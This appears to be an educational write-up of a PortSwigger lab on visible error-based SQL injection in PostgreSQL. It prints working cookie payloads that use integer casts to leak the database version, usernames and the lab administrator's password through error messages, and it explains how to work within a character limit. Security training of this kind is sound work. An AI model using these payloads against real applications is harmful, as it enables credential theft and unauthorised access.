# Visible Error-Based SQL Injection

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

To solve the lab, log in as the administrator user.

---

## Lab

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

**Visible Error-Based SQLi** exploits a misconfigured database that returns verbose error messages to the user. Unlike Blind SQLi — where we infer data from true/false conditions — here the **error message itself leaks the data** we want to extract.

The key trick is using `::int` to force a **type conversion error**. When we try to cast a string value like a password into an integer, the database throws an error and includes the actual value in the message:

```
ERROR: invalid input syntax for type integer: "s3cr3tpassword"
```

This effectively turns a blind vulnerability into a **visible** one — we read data directly from the error output.

---

## Steps to Solve

---

**Step 1 — Confirm Verbose Errors**

Inject a single quote to break the query:

```http
Cookie: TrackingId=x'
```

The application returns a detailed database error confirming:
- Verbose errors are **enabled**
- Injection point is inside a **single-quoted string**
- Database is **PostgreSQL**

<img width="966" height="124" alt="image" src="https://github.com/user-attachments/assets/eba84b2b-f9e6-47b2-9e3e-b3f4542dd196" />

---

**Step 2 — Confirm Clean Injection**

Append `--` to comment out the rest:

```http
Cookie: TrackingId=x'--
```

Normal **200 response** — injection is clean and `x` works as our short TrackingId prefix.

> **Why `x` instead of real TrackingId?**
> The application has a strict character limit on the cookie value. The real TrackingId value is 16 characters — every character we use for the ID is one less we have for our payload. Replacing it with `x` (1 character) saves 15 characters for our query.

<img width="356" height="113" alt="image" src="https://github.com/user-attachments/assets/c1263aba-2d77-4e5c-b75c-5f565c81a6fb" />

---

**Step 3 — Identify the Database**

```http
Cookie: TrackingId=x' AND 1=CAST((SELECT version()) AS INT)--
```

Error response:

```
ERROR: invalid input syntax for type integer: "PostgreSQL 12.x ..."
```

**Database confirmed: PostgreSQL** — version leaked directly in the error.

<img width="942" height="106" alt="image" src="https://github.com/user-attachments/assets/32ad4bae-3ba5-4753-94c8-4822d40c6e08" />

---

## Character Limit Problem

At this point we hit a serious obstacle. The application passes our TrackingId value directly into a SQL query like this:

```sql
SELECT * FROM tracking WHERE id = 'OUR_INPUT_HERE'
```

The full query including our input cannot exceed **95 characters total**. The database prefix alone is:

```
SELECT * FROM tracking WHERE id = '        → 36 chars
closing quote at end                       →  1 char
─────────────────────────────────────────────────────
Characters left for our input              → 58 chars
```

Any query we build for schema, table, or column enumeration — even using the shortest PostgreSQL native syntax like `pg_namespace` and `pg_tables` — either hits the limit or requires `WHERE` clauses to paginate through results, which push us well over 58 characters.

For example this query for schema enumeration:

```
x'||(SELECT nspname::int FROM pg_namespace WHERE nspname!='pg_toast')--
```

Is already **70 characters** — 12 over the limit.

**We cannot reliably enumerate schemas, tables, and columns within this character limit.**

---

## Solution — Use Knowledge from Previous Lab

In the previous lab **Blind SQL Injection with Conditional Responses** on the same PortSwigger platform, we already fully enumerated this database and found:

| What | Value |
|------|-------|
| Database | PostgreSQL |
| Schema | public |
| Table | users |
| Column 1 | username |
| Column 2 | password |
| Column 3 | email |

Since this is the same lab environment and same database structure, we can **skip enumeration entirely** and go directly to extracting credentials.

---

## Extract Username

```http
Cookie: TrackingId=x'||(SELECT username::int FROM users)--
```

Error response:

```
ERROR: invalid input syntax for type integer: "administrator"
```

Username found: **administrator** — our targeted user.

<img width="817" height="41" alt="image" src="https://github.com/user-attachments/assets/3af072de-d9ce-4add-a8f3-204528b9a84a" />

---

## Extract Password

```http
Cookie: TrackingId=x'||(SELECT password::int FROM users)--
```

Error response:

```
ERROR: invalid input syntax for type integer: "cl5vr5mhpfrp1ey3axvf"
```

Full password leaked in a **single request** — no fuzzing, no character-by-character guessing.

<img width="890" height="71" alt="image" src="https://github.com/user-attachments/assets/4507e6af-f690-459d-aef4-eaa8a787b595" />

---

## Log In as Administrator

Navigate to the login page and enter:

- **Username:** `administrator`
- **Password:** `cl5vr5mhpfrp1ey3axvf`

---

**Lab Solved**

<img width="1561" height="681" alt="image" src="https://github.com/user-attachments/assets/4428c335-a5f4-4c02-935c-f21f71b8e770" />

---

## How This Differs from Previous Labs

| | Conditional Response | Conditional Error | Visible Error |
|--|--|--|--|
| True condition shows | Welcome back! | 500 error | Data in error text |
| False condition shows | No message | 200 normal | No error |
| Identify data by | Response body size | Status code | **Reading error message** |
| Requests needed per value | One per character | One per character | **One per column** |
| Requires fuzzer | Yes | Yes | **No** |
| Core technique | `AND '1'='1` | `CASE WHEN 1/0` | **`::int` cast** |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
